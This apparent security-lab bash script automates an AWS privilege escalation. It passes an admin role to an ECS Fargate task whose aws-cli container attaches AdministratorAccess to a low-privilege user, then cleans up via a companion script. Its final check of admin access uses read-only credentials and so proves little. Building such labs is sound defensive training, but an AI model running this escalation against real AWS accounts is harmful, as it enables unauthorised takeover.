#!/bin/bash

# Demo script for iam:PassRole + ecs:CreateCluster + ecs:RegisterTaskDefinition + ecs:RunTask privilege escalation
# This scenario demonstrates how a user with ECS permissions can escalate to admin by running a task with an admin role


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ecs-002-to-admin-starting-user"
ADMIN_ROLE="pl-prod-ecs-002-to-admin-target-role"
CLUSTER_NAME="pl-prod-ecs-002-attack-cluster"
TASK_FAMILY="pl-ecs-002-admin-escalation"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}ECS PassRole + CreateCluster + RegisterTaskDefinition + RunTask Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_002_iam_passrole_ecs_createcluster_ecs_registertaskdefinition_ecs_runtask.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Create ECS cluster
use_starting_creds
echo -e "${YELLOW}Step 5: Creating ECS cluster${NC}"
echo "Cluster name: $CLUSTER_NAME"
echo "This demonstrates the ecs:CreateCluster permission..."

show_attack_cmd "Attacker" "aws ecs create-cluster --region $AWS_REGION --cluster-name \"$CLUSTER_NAME\" --output json"
CLUSTER_RESULT=$(aws ecs create-cluster \
    --region $AWS_REGION \
    --cluster-name "$CLUSTER_NAME" \
    --output json)

if [ $? -eq 0 ]; then
    CLUSTER_ARN=$(echo "$CLUSTER_RESULT" | jq -r '.cluster.clusterArn')
    echo "Cluster ARN: $CLUSTER_ARN"
    echo -e "${GREEN}✓ Successfully created ECS cluster${NC}"
else
    echo -e "${RED}Error: Failed to create ECS cluster${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 6: Get network configuration for Fargate
use_readonly_creds
echo -e "${YELLOW}Step 6: Getting network configuration for Fargate tasks${NC}"
echo "Fargate requires network configuration (VPC and subnet)..."

# Get default VPC
DEFAULT_VPC=$(aws ec2 describe-vpcs \
    --region $AWS_REGION \
    --filters "Name=is-default,Values=true" \
    --query 'Vpcs[0].VpcId' \
    --output text)

if [ -z "$DEFAULT_VPC" ] || [ "$DEFAULT_VPC" == "None" ]; then
    echo -e "${RED}Error: No default VPC found. Fargate requires VPC configuration.${NC}"
    echo "Creating a VPC is beyond the scope of this demo."
    echo "Please ensure a default VPC exists or modify this script to use a custom VPC."
    exit 1
fi

echo "Default VPC: $DEFAULT_VPC"

# Get a subnet from the default VPC
DEFAULT_SUBNET=$(aws ec2 describe-subnets \
    --region $AWS_REGION \
    --filters "Name=vpc-id,Values=$DEFAULT_VPC" \
    --query 'Subnets[0].SubnetId' \
    --output text)

if [ -z "$DEFAULT_SUBNET" ] || [ "$DEFAULT_SUBNET" == "None" ]; then
    echo -e "${RED}Error: No subnet found in default VPC${NC}"
    exit 1
fi

echo "Subnet: $DEFAULT_SUBNET"
echo -e "${GREEN}✓ Retrieved network configuration${NC}\n"

# [EXPLOIT] Step 7: Register task definition with admin role (PassRole escalation)
use_starting_creds
echo -e "${YELLOW}Step 7: Registering ECS task definition with admin role${NC}"
echo "This is the privilege escalation vector - passing the admin role to ECS task..."
ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
echo "Admin Role ARN: $ADMIN_ROLE_ARN"

# Create task definition that grants admin access to starting user
# The container command uses AWS CLI to attach AdministratorAccess policy
TASK_DEF='{
  "family": "'$TASK_FAMILY'",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "taskRoleArn": "'$ADMIN_ROLE_ARN'",
  "executionRoleArn": "'$ADMIN_ROLE_ARN'",
  "containerDefinitions": [
    {
      "name": "escalation-container",
      "image": "amazon/aws-cli:latest",
      "essential": true,
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "'$STARTING_USER'",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ],
      "logConfiguration": {
        "logDriver": "awslogs",
        "options": {
          "awslogs-create-group": "true",
          "awslogs-group": "/ecs/'$TASK_FAMILY'",
          "awslogs-region": "'$AWS_REGION'",
          "awslogs-stream-prefix": "ecs"
        }
      }
    }
  ]
}'

show_attack_cmd "Attacker" "aws ecs register-task-definition --region $AWS_REGION --cli-input-json \"...\""
REGISTER_RESULT=$(aws ecs register-task-definition \
    --region $AWS_REGION \
    --cli-input-json "$TASK_DEF" \
    --output json)

if [ $? -eq 0 ]; then
    TASK_DEF_ARN=$(echo "$REGISTER_RESULT" | jq -r '.taskDefinition.taskDefinitionArn')
    TASK_DEF_REVISION=$(echo "$REGISTER_RESULT" | jq -r '.taskDefinition.revision')
    echo "Task Definition ARN: $TASK_DEF_ARN"
    echo "Revision: $TASK_DEF_REVISION"
    echo -e "${GREEN}✓ Successfully registered task definition with admin role!${NC}"
else
    echo -e "${RED}Error: Failed to register task definition${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 8: Run the ECS task on Fargate
use_starting_creds
echo -e "${YELLOW}Step 8: Running ECS task on Fargate${NC}"
echo "This task will use the admin role to grant admin access to our starting user..."

show_attack_cmd "Attacker" "aws ecs run-task --region $AWS_REGION --cluster \"$CLUSTER_NAME\" --task-definition \"$TASK_FAMILY\" --launch-type FARGATE --network-configuration \"awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}\""
RUN_TASK_RESULT=$(aws ecs run-task \
    --region $AWS_REGION \
    --cluster "$CLUSTER_NAME" \
    --task-definition "$TASK_FAMILY" \
    --launch-type FARGATE \
    --network-configuration "awsvpcConfiguration={subnets=[$DEFAULT_SUBNET],assignPublicIp=ENABLED}" \
    --output json)

if [ $? -eq 0 ]; then
    TASK_ARN=$(echo "$RUN_TASK_RESULT" | jq -r '.tasks[0].taskArn')
    echo "Task ARN: $TASK_ARN"
    echo -e "${GREEN}✓ Successfully started ECS task${NC}"
else
    echo -e "${RED}Error: Failed to run ECS task${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 9: Wait for task to complete
use_readonly_creds
echo -e "${YELLOW}Step 9: Waiting for ECS task to complete${NC}"
echo "Monitoring task status (this may take 1-2 minutes)..."
echo ""

MAX_WAIT=120  # Maximum wait time in seconds
WAIT_INTERVAL=10
ELAPSED=0

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws ecs describe-tasks --region $AWS_REGION --cluster \"$CLUSTER_NAME\" --tasks \"$TASK_ARN\" --query 'tasks[0].lastStatus' --output text"
    TASK_STATUS=$(aws ecs describe-tasks \
        --region $AWS_REGION \
        --cluster "$CLUSTER_NAME" \
        --tasks "$TASK_ARN" \
        --query 'tasks[0].lastStatus' \
        --output text)

    echo "Task status: $TASK_STATUS (waited ${ELAPSED}s)"

    if [ "$TASK_STATUS" == "STOPPED" ]; then
        echo -e "${GREEN}✓ Task completed${NC}"

        # Check exit code
        EXIT_CODE=$(aws ecs describe-tasks \
            --region $AWS_REGION \
            --cluster "$CLUSTER_NAME" \
            --tasks "$TASK_ARN" \
            --query 'tasks[0].containers[0].exitCode' \
            --output text)

        if [ "$EXIT_CODE" == "0" ]; then
            echo -e "${GREEN}✓ Task exited successfully (exit code: 0)${NC}"
            break
        else
            echo -e "${YELLOW}⚠ Task exited with code: $EXIT_CODE${NC}"
            break
        fi
    fi

    sleep $WAIT_INTERVAL
    ELAPSED=$((ELAPSED + WAIT_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${YELLOW}⚠ Task did not complete within ${MAX_WAIT} seconds${NC}"
    echo "The task may still be running. Proceeding to verify admin access..."
fi
echo ""

# Step 10: Wait for IAM policy propagation
echo -e "${YELLOW}Step 10: Waiting for IAM policy propagation${NC}"
echo "Allowing time for IAM changes to propagate..."
sleep 15
echo -e "${GREEN}✓ IAM policy propagated${NC}\n"

# [OBSERVATION] Step 11: Verify admin access
use_readonly_creds
echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}The task may have failed. Check CloudWatch logs:${NC}"
    echo "  Log Group: /ecs/$TASK_FAMILY"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with ecs:CreateCluster, iam:PassRole, ecs:RegisterTaskDefinition, ecs:RunTask)"
echo "2. Created ECS cluster: $CLUSTER_NAME"
echo "3. Registered task definition with admin role: $ADMIN_ROLE"
echo "4. Ran ECS Fargate task that attached AdministratorAccess policy to starting user"
echo "5. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER → (CreateCluster) → $CLUSTER_NAME"
echo "  → (RegisterTaskDefinition + PassRole) → Task with $ADMIN_ROLE"
echo "  → (RunTask) → Task attaches admin policy → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Cluster: $CLUSTER_NAME"
echo "- Task Definition: $TASK_FAMILY (revision $TASK_DEF_REVISION)"
echo "- ECS Task: $TASK_ARN"
echo "- IAM Policy: AdministratorAccess attached to $STARTING_USER"
echo "- CloudWatch Log Group: /ecs/$TASK_FAMILY"

echo -e "\n${RED}⚠ Warning: The ECS cluster and admin policy attachment persist${NC}"
echo -e "${RED}⚠ ECS clusters may incur minimal charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
